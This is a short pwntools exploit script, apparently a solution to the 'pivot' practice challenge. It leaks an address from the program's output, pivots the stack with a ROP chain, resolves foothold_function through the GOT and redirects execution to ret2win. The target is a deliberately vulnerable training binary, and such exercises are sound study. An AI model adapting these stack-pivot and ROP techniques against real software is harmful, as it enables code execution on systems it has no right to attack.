from pwn import *

proc = process("./pivot")
data = proc.recv().decode()
pos  = data.find("pivot: ") + 7
addr = int(data[pos : pos + 14].strip(), 16)
print("data: " + data)
print("leaked address: " + hex(addr))

payload = b'0' * 40
payload += p64(0x00000000004009bb) # 0x00000000004009bb : pop rax ; ret
payload += p64(addr)
payload += p64(0x00000000004009bd) # 0x00000000004009bd : xchg rsp, rax ; ret

chain = p64(0x0000000000400720)  # .plt:0000000000400720 _foothold_function
chain += p64(0x00000000004009bb) # 0x00000000004009bb : pop rax ; ret
chain += p64(0x0000000000601040) # .got.plt:0000000000601040 off_601040      dq offset foothold_function
chain += p64(0x00000000004009c0) # 0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
chain += p64(0x00000000004007c8) # 0x00000000004007c8 : pop rbp ; ret
# .text:0000000000000A81 ret2win
# .text:000000000000096A foothold_function
chain += p64(0x0000000000000A81 - 0x000000000000096A)
chain += p64(0x00000000004009c4) # 0x00000000004009c4 : add rax, rbp ; ret
chain += p64(0x00000000004006b0) # 0x00000000004006b0 : call rax

print("chain:   ", len(chain))
print("payload: ", len(payload))

proc.sendline(chain)
proc.sendline(payload)
proc.interactive()
